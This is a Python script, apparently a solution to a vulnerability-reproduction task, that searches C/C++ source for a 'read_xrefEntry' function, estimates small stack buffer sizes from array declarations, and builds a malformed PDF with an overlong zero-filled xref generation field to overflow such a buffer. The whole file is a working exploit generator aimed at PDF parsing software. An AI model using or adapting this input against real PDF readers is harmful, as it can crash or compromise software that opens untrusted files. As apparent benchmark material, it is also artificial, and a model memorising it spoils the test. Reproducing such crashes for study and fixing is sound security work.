import os
import re
import tarfile
from typing import Iterable, Optional


class Solution:
    def _iter_source_texts(self, src_path: str) -> Iterable[str]:
        exts = (".cc", ".cpp", ".cxx", ".c", ".h", ".hh", ".hpp", ".ipp", ".inl")
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not fn.endswith(exts):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        st = os.stat(path)
                        if st.st_size <= 0 or st.st_size > 5_000_000:
                            continue
                        with open(path, "rb") as f:
                            data = f.read()
                        yield data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not name.endswith(exts):
                        continue
                    if m.size <= 0 or m.size > 5_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
        except Exception:
            return

    def _infer_zero_count(self, src_path: str) -> int:
        # Default chosen to reliably exceed small stack buffers while keeping payload small.
        zero_count = 32

        # Try to infer a safe count from source heuristics, but keep bounded.
        try:
            for text in self._iter_source_texts(src_path):
                idx = text.find("read_xrefEntry")
                if idx == -1:
                    continue
                window = text[idx: idx + 12000]

                sizes = [int(m.group(1)) for m in re.finditer(r"\bchar\s+\w+\s*\[\s*(\d+)\s*\]", window)]
                # Also consider std::array<char, N>
                sizes += [int(m.group(1)) for m in re.finditer(r"std::array\s*<\s*char\s*,\s*(\d+)\s*>", window)]

                if sizes:
                    small_sizes = [s for s in sizes if 1 <= s <= 64]
                    if small_sizes:
                        # Inflate to exceed any plausible small EOL/token buffer.
                        smax = max(small_sizes)
                        zero_count = max(zero_count, min(256, smax * 8))
                break
        except Exception:
            pass

        if zero_count < 16:
            zero_count = 16
        if zero_count > 256:
            zero_count = 256
        return zero_count

    def solve(self, src_path: str) -> bytes:
        zeros = self._infer_zero_count(src_path)

        prefix = b"%PDF-1.0\nxref\n0 1\n"
        # Overlong f2 (generation) consisting only of zeros; newline present but far past where EOL is expected.
        entry = b"0000000000 " + (b"0" * zeros) + b"\n"
        # Point startxref to the xref keyword right after the header (offset 9 bytes).
        suffix = b"startxref\n9\n%%EOF"

        return prefix + entry + suffix